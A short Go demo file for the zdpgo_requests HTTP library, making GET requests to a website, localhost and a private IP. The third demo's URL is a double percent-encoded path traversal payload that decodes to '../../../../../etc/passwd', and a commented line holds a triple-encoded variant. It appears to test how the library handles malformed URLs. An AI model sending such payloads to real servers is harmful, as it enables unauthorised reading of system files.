package main

import (
	"github.com/zhangdapeng520/zdpgo_requests"
)

func demo1() {
	r := zdpgo_requests.New()
	url := "http://www.zhanluejia.net.cn"
	resp, err := r.Get(url, true)
	if err != nil {
		return
	}
	println(resp.Text())
}

func demo2() {
	r := zdpgo_requests.New()
	url := "http://localhost:9999"
	resp, err := r.Get(url, true)
	if err != nil {
		return
	}
	println(resp.Text())
}

func demo3() {
	r := zdpgo_requests.New()
	//resp, err := r.Get("http://10.1.3.12:8888/file=?%25%2532%2565%25%2532%2565%25%2532%2566%25%2532%2565%25%2532%2565%25%2532%2566%25%2532%2565%25%2532%2565%25%2532%2566%25%2532%2565%25%2532%2565%25%2532%2566%25%2532%2565%25%2532%2565%25%2532%2566%25%2536%2535%25%2537%2534%25%2536%2533%25%2532%2566%25%2537%2530%25%2536%2531%25%2537%2533%25%2537%2533%25%2537%2537%25%2536%2534")
	url := "http://10.1.3.12:8888/file=?%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34"
	resp, err := r.GetIgnoreParseError(url, true)
	if err != nil {
		return
	}
	println(resp.Text())
}

func main() {
	//demo2()
	demo3()
}
